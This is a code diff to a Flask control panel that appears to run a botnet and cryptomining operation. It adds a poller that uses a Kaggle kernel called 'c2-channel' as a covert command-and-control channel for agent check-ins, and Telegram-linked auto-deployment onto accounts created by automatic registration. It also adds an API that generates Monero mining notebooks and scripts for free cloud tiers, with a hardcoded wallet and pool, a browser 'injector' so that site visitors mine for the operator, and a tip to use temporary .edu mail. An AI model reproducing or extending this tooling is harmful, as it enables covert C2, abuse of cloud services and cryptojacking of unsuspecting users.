@@ -96,6 +96,14 @@ bcrypt = Bcrypt(app)
 _async_mode = "eventlet"
 socketio = SocketIO(app, cors_allowed_origins="*", async_mode=_async_mode)
 
+# Dataset C2 Poller for automatic kernel output sync
+try:
+    from src.c2.dataset_c2_poller import start_poller, stop_poller
+    DATASET_C2_POLLER_AVAILABLE = True
+except ImportError:
+    DATASET_C2_POLLER_AVAILABLE = False
+    stop_poller = None
+
 # Register stratum proxy blueprint for Kaggle mining tunnel
 if STRATUM_PROXY_AVAILABLE:
     app.register_blueprint(proxy_bp, url_prefix='/api/proxy')
@@ -703,6 +711,12 @@ def hashvault_page():
     """HashVault pool monitoring page."""
     return render_template("hashvault.html")
 
+@app.route("/mining")
+@login_required
+def mining_page():
+    """Mining platforms deployment page."""
+    return render_template("mining.html")
+
 @app.route("/tempmail")
 @login_required
 def tempmail_page():
@@ -718,6 +732,18 @@ def autoreg_start():
     platform = data.get("platform", "")
     if platform not in PLATFORMS:
         return jsonify({"error": f"Unknown platform: {platform}"}), 400
+    
+    # Auto-deploy settings
+    auto_deploy = data.get("auto_deploy", {})
+    telegram_token = data.get("telegram_token") or auto_deploy.get("telegram_token")
+    telegram_chat = data.get("telegram_chat") or auto_deploy.get("telegram_chat")
+    
+    # Set environment for auto-deploy
+    if telegram_token:
+        os.environ["TG_BOT_TOKEN"] = telegram_token
+    if telegram_chat:
+        os.environ["TG_CHAT_ID"] = telegram_chat
+    
     try:
         job = job_manager.create_job(
             platform=platform,
@@ -728,6 +754,7 @@ def autoreg_start():
             proxy=data.get("proxy", ""),
             parallel=min(int(data.get("parallel", 1)), 3),  # Max 3 parallel workers
             browser=data.get("browser", "chrome"),  # 'chrome' or 'firefox'
+            auto_deploy=auto_deploy,  # Pass auto-deploy settings
         )
     except ValueError as e:
         return jsonify({"error": str(e)}), 409
@@ -4015,6 +4042,63 @@ def get_kernel_output():
         
         return jsonify({"files": output_files})
 
+@app.route("/api/kaggle/dataset-c2/agents", methods=["GET"])
+@login_required
+def dataset_c2_get_agents():
+    """Get agents from kernel output (Dataset C2) and save to DB."""
+    username = request.args.get("username", "cassandradixon320631")
+    api_key = request.args.get("api_key", os.environ.get("KAGGLE_KEY", ""))
+    kernel_slug = request.args.get("kernel", "cassandradixon320631/c2-channel")
+    
+    if not api_key:
+        # Try config
+        api_key = get_config("kaggle_api_key", "")
+        username = get_config("kaggle_username", username)
+    
+    with tempfile.TemporaryDirectory() as tmpdir:
+        try:
+            result = subprocess.run(
+                ["kaggle", "kernels", "output", kernel_slug, "-p", tmpdir],
+                capture_output=True, text=True, timeout=120,
+                env={**os.environ, "KAGGLE_USERNAME": username, "KAGGLE_KEY": api_key}
+            )
+        except Exception as e:
+            return jsonify({"error": str(e)}), 500
+        
+        # Parse c2-agents.json
+        agents_file = Path(tmpdir) / "c2-agents.json"
+        agents = []
+        if agents_file.exists():
+            try:
+                agents = json.loads(agents_file.read_text())
+                if not isinstance(agents):
+                    agents = [agents] if isinstance(agents, dict) else []
+            except:
+                agents = []
+        
+        # Save to DB
+        db = get_db()
+        saved_count = 0
+        for agent in agents:
+            agent_id = agent.get("id", "")
+            if not agent_id:
+                continue
+            
+            existing = db.execute("SELECT id FROM agents WHERE id=?", (agent_id,)).fetchone()
+            if existing:
+                db.execute("UPDATE agents SET last_seen=datetime('now'), is_alive=1 WHERE id=?", (agent_id,))
+            else:
+                db.execute("""INSERT INTO agents (id, hostname, username, os, arch, ip_external, platform_type)
+                              VALUES (?, ?, ?, ?, ?, ?, ?)""",
+                           (agent_id, agent.get("hostname", ""), agent.get("username", "kaggle"),
+                            agent.get("os", "linux"), agent.get("arch", "x64"),
+                            "kaggle", agent.get("platform_type", "kaggle")))
+            saved_count += 1
+        
+        db.commit()
+        
+        return jsonify({"agents": agents, "saved": saved_count})
+
 # Deploy progress tracking with persistence
 DEPLOY_STATE_FILE = BASE_DIR / "data" / "deploy_state.json"
 
@@ -5640,6 +5724,24 @@ def main():
     parser.add_argument("--no-tunnel", action="store_true")
     args = parser.parse_args()
 
+    # Start Dataset C2 Poller for automatic kernel output sync
+    if DATASET_C2_POLLER_AVAILABLE:
+        kaggle_username = get_config("kaggle_username", "cassandradixon320631")
+        kaggle_key = get_config("kaggle_api_key", os.environ.get("KAGGLE_KEY", ""))
+        kernel_slug = get_config("kaggle_kernel_slug", "cassandradixon320631/c2-channel")
+        
+        if kaggle_key:
+            start_poller(
+                db_path=str(BASE_DIR / "data" / "c2.db"),
+                kaggle_username=kaggle_username,
+                kaggle_key=kaggle_key,
+                kernel_slug=kernel_slug,
+                interval=60
+            )
+            print(f"[*] Dataset C2 Poller started for {kernel_slug}")
+        else:
+            print("[*] Dataset C2 Poller disabled (no Kaggle API key)")
+
     ssl_ctx = None
     if not args.no_ssl:
         cert = BASE_DIR / "data" / "cert.pem"
@@ -5872,3 +5974,225 @@ def api_create_link():
         "display_url": links[code]["display_url"],
         "target_url": target_url,
     })
+
+
+# ──────────────────────── MINING PLATFORMS API ────────────────────────
+
+@app.route("/api/mining/platforms")
+@login_required
+def mining_platforms():
+    """Get all available mining platforms with details."""
+    from src.agents.cloud.paperspace import PaperspaceMiner
+    from src.agents.cloud.modal import ModalMiner
+    from src.agents.cloud.mybinder import MyBinderMiner, AzureStudentMiner
+    from src.agents.cloud.browser_mining import BrowserMiner
+    
+    platforms = {
+        "cloud_gpu": [
+            {
+                "id": "paperspace",
+                "name": "Paperspace Gradient",
+                "url": "https://console.paperspace.com/signup",
+                "icon": "🖥️",
+                "gpu": True,
+                "free": True,
+                "phone_required": False,
+                "description": "FREE GPU (M4000), email only registration",
+                "instructions": [
+                    "1. Sign up with email (no phone)",
+                    "2. Create Gradient project",
+                    "3. Create notebook with FREE GPU",
+                    "4. Upload mining notebook",
+                    "5. Run mining cells"
+                ]
+            },
+            {
+                "id": "modal",
+                "name": "Modal",
+                "url": "https://modal.com",
+                "icon": "⚡",
+                "gpu": True,
+                "free_credits": "$30/month",
+                "phone_required": False,
+                "description": "$30/month FREE credits, GPU (A10G/A100)",
+                "instructions": [
+                    "1. Sign up with GitHub",
+                    "2. Get $30/month automatically",
+                    "3. pip install modal",
+                    "4. modal token new",
+                    "5. Deploy mining script"
+                ]
+            },
+            {
+                "id": "kaggle",
+                "name": "Kaggle",
+                "url": "https://www.kaggle.com",
+                "icon": "🏆",
+                "gpu": True,
+                "free": True,
+                "phone_required": False,
+                "description": "FREE GPU (T4/P100), 30h/week",
+                "instructions": [
+                    "1. Register via Auto-Reg",
+                    "2. Create notebook",
+                    "3. Enable GPU accelerator",
+                    "4. Run mining code"
+                ]
+            }
+        ],
+        "no_auth": [
+            {
+                "id": "mybinder",
+                "name": "MyBinder",
+                "url": "https://mybinder.org",
+                "icon": "📓",
+                "gpu": False,
+                "free": True,
+                "phone_required": False,
+                "registration": False,
+                "description": "Free Jupyter, NO registration, CPU only, 12h limit",
+                "instructions": [
+                    "1. Create GitHub repo with notebook",
+                    "2. Go to mybinder.org",
+                    "3. Enter repo URL",
+                    "4. Launch (no login!)",
+                    "5. Run mining cells"
+                ]
+            }
+        ],
+        "student": [
+            {
+                "id": "azure_student",
+                "name": "Azure for Students",
+                "url": "https://azure.microsoft.com/free/students",
+                "icon": "🎓",
+                "gpu": True,
+                "free_credits": "$100",
+                "phone_required": False,
+                "requires_edu": True,
+                "description": "$100 credits, NO credit card, .edu email required",
+                "instructions": [
+                    "1. Get .edu email (use EDU temp mail)",
+                    "2. Sign up with .edu",
+                    "3. Verify student status",
+                    "4. Get $100 credits",
+                    "5. Create GPU VM"
+                ]
+            }
+        ],
+        "browser": [
+            {
+                "id": "coinimp",
+                "name": "CoinIMP",
+                "url": "https://www.coinimp.com",
+                "icon": "🌐",
+                "gpu": False,
+                "free": True,
+                "phone_required": False,
+                "fee": "0%",
+                "description": "Browser JavaScript mining, 0% fee",
+                "instructions": [
+                    "1. Embed JS in website",
+                    "2. Visitors mine for you",
+                    "3. Or run in own browser"
+                ]
+            }
+        ]
+    }
+    
+    return jsonify({
+        "status": "ok",
+        "platforms": platforms,
+        "wallet": "44haKQM5F43d37q3k6mV45YbrL5g6wGHWNB5uyt2cDfTdR8d9FicJCbitjm1xeKZzEVULG7MqdVFWEa9wKXsNLTpFvzffR5",
+        "pool": "pool.hashvault.pro:80"
+    })
+
+
+@app.route("/api/mining/deploy/<platform_id>", methods=["POST"])
+@login_required
+def mining_deploy(platform_id):
+    """Generate deployment code for mining platform."""
+    data = request.get_json(silent=True) or {}
+    
+    wallet = data.get("wallet", "44haKQM5F43d37q3k6mV45YbrL5g6wGHWNB5uyt2cDfTdR8d9FicJCbitjm1xeKZzEVULG7MqdVFWEa9wKXsNLTpFvzffR5")
+    pool = data.get("pool", "pool.hashvault.pro:80")
+    
+    if platform_id == "mybinder":
+        from src.agents.cloud.mybinder import MyBinderMiner
+        notebook = MyBinderMiner.generate_notebook(wallet, pool)
+        return jsonify({
+            "status": "ok",
+            "platform": "mybinder",
+            "notebook": notebook,
+            "instructions": MyBinderMiner.get_binder_url("USER", "REPO")
+        })
+    
+    elif platform_id == "paperspace":
+        from src.agents.cloud.paperspace import PaperspaceMiner
+        notebook = PaperspaceMiner.generate_notebook(wallet, pool)
+        return jsonify({
+            "status": "ok",
+            "platform": "paperspace",
+            "notebook": notebook,
+            "instructions": PaperspaceMiner.get_instructions()
+        })
+    
+    elif platform_id == "modal":
+        from src.agents.cloud.modal import ModalMiner
+        script = ModalMiner.generate_script(wallet, pool)
+        return jsonify({
+            "status": "ok",
+            "platform": "modal",
+            "script": script,
+            "instructions": ModalMiner.get_instructions()
+        })
+    
+    elif platform_id == "browser":
+        from src.agents.cloud.browser_mining import BrowserMiner
+        html = BrowserMiner.generate_html(wallet)
+        js = BrowserMiner.generate_injector(wallet)
+        return jsonify({
+            "status": "ok",
+            "platform": "browser",
+            "html_code": html,
+            "injector_js": js
+        })
+    
+    elif platform_id == "azure_student":
+        from src.agents.cloud.mybinder import AzureStudentMiner
+        return jsonify({
+            "status": "ok",
+            "platform": "azure_student",
+            "deployment_script": AzureStudentMiner.generate_deployment_script(),
+            "requires_edu": True
+        })
+    
+    return jsonify({"error": f"Unknown platform: {platform_id}"}), 404
+
+
+@app.route("/api/mining/notebook/<platform_id>")
+@login_required
+def mining_notebook(platform_id):
+    """Download mining notebook for platform."""
+    from src.agents.cloud.mybinder import MyBinderMiner
+    from src.agents.cloud.paperspace import PaperspaceMiner
+    import json
+    
+    notebook = None
+    filename = f"{platform_id}_mining.ipynb"
+    
+    if platform_id == "mybinder":
+        notebook = MyBinderMiner.generate_notebook()
+    elif platform_id == "paperspace":
+        notebook = PaperspaceMiner.generate_notebook()
+    
+    if notebook:
+        response = app.response_class(
+            response=json.dumps(notebook, indent=2),
+            status=200,
+            mimetype='application/json'
+        )
+        response.headers["Content-Disposition"] = f"attachment; filename={filename}"
+        return response
+    
+    return jsonify({"error": "Notebook not available"}), 404
